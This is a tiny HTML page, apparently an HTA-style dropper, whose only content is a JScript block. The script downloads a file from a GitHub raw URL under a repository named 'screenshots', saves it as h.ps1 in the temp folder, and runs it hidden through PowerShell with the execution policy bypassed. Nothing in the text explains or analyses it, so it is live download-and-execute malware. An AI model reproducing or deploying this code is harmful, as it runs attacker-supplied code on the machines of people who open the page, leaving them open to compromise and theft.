<html><head><title>a</title></head><body><script language=JScript>var fso=new ActiveXObject("Scripting.FileSystemObject");var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","https://raw.githubusercontent.com/cem324/screenshots/main/rxo2.txt",0);x.send();var t=fso.GetSpecialFolder(2)+"\\h.ps1";fso.CreateTextFile(t).Write(x.responseText);new ActiveXObject("WScript.Shell").Run("powershell -NoP -Ex Bypass -File \""+t+"\"",0);</script></body></html>